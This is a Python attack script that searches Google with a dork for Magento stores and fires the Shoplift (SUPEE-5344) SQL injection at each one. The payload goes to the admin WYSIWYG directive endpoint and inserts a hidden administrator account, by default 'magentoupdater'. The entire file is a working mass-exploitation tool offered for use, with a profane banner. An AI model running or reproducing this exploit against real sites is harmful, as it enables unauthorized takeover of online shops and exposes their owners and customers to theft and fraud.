###################################################################################################
#Scanner : LetMeFuckIt by OntheFrontLine in 27/09/2015
#Exploit: Magento Shoplift exploit (SUPEE-5344) by Manish Kishan Tanwar AKA error1046 in 25/08/2015
###################################################################################################


import argparse, base64

import requests, pygoogle


save = ''
usermagento = ''
passmagento = ''


print("""
 __      ______  _________   ___ __ __  ______       ______  __  __  ______  ___   ___      ________  _________
/_/\\    /_____/\\/________/\\ /__//_//_/\\/_____/\\     /_____/\\/_/\\/_/\\/_____/\\/___/\\/__/\\    /_______/\\/________/\\
\\:\\ \\   \\::::_\\/\\__.::.__\\/ \\::\\| \\| \\ \\::::_\\/_    \\::::_\\/\\:\\ \\:\\ \\:::__\\/\\::.\\ \\\\ \\ \\   \\__.::._\\/\\__.::.__\\/
 \\:\\ \\   \\:\\/___/\\ \\::\\ \\    \\:.      \\ \\:\\/___/\\    \\:\\/___/\\:\\ \\:\\ \\:\\ \\  _\\:: \\/_) \\ \\     \\::\\ \\    \\::\\ \\
  \\:\\ \\___\\::___\\/_ \\::\\ \\    \\:.\\-/\\  \\ \\::___\\/_    \\:::._\\/\\:\\ \\:\\ \\:\\ \\/_/\\:. __  ( (     _\\::\\ \\__  \\::\\ \\
   \\:\\/___/\\:\\____/\\ \\::\\ \\    \\. \\  \\  \\ \\:\\____/\\    \\:\\ \\   \\:\\_\\:\\ \\:\\_\\ \\ \\: \\ )  \\ \\   /__\\::\\__/\\  \\::\\ \\
    \\_____\\/\\_____\\/  \\__\\/     \\__\\/ \\__\\/\\_____\\/     \\_\\/    \\_____\\/\\_____\\/\\__\\/\\__\\/   \\________\\/   \\__\\/
""")

print("""
 Welcome to Let me fuck It!
 Let's Exploit!

 Help: --h

""")

parser = argparse.ArgumentParser(description=' Options:')
parser.add_argument('--dork', help='Google Dork like inurl:/customer/account/login/')
parser.add_argument('--user', help='Name of new user to add')
parser.add_argument('--pwd', help='Password for the new user')
parser.add_argument('--pages', type=int, help='Total of pages to print')

args = parser.parse_args()

if args.user == None:
    usermagento = 'magentoupdater'
    passmagento = 'magentoupdater'
    print('\n User/pass not configured. Default settings will be loaded.')
else:
    usermagento = args.user
    passmagento = args.pwd

if args.dork == None:
    print("\n Usage: python letmefuckit.py --dork <dork> [options]")

else:
    saveresults = open("urls.txt", "w")
    print(" Searching for: ", args.dork)
    print(" Total of google pages to process: ", args.pages)
    print(" Save results is ", save)
    print('\n Initializing...')

    g = pygoogle(args.dork)
    g.pages = 5
    print(' [* Found %s results in search engine *]\n'%(g.get_result_count()))
    urles = g.get_urls()
    for n, elem in enumerate(urles):
             url = '{1}\n'.format(n, elem)
             saveresults.write(url)
    saveresults.close()
    print("""
--------------------------
Right! Analysing data....
--------------------------

Possible targets found...
    """)

    text_file = open("urls.txt","r")
    for line in text_file:
        line = line.split("//")
        line1 = line[1]
        line1 = line1.split("/")
        print(line1[0])
        target = line1[0]
        if not target.startswith("http"):
            target = "http://" + target

        if target.endswith("/"):
            target = target[:-1]

        target_url = target + "/admin/Cms_Wysiwyg/directive/index/"
        q="""
        SET @SALT = 'rp';
        SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
        SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
        INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
        INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
        """
        query = q.replace("\n", "").format(username=usermagento, password=passmagento)
        pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
        r = requests.post(target_url,
                          data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                                "filter": base64.b64encode(pfilter),
                            "forwarded": 1})
        if r.ok:
            print("Possible inclusion successful: {0} ".format(target))
            print("Check site with credentials: User: %s  and Pass: %s" % (usermagento, passmagento))
            print()
        else:
            print("is not vulnerable.\n")
    text_file.close()
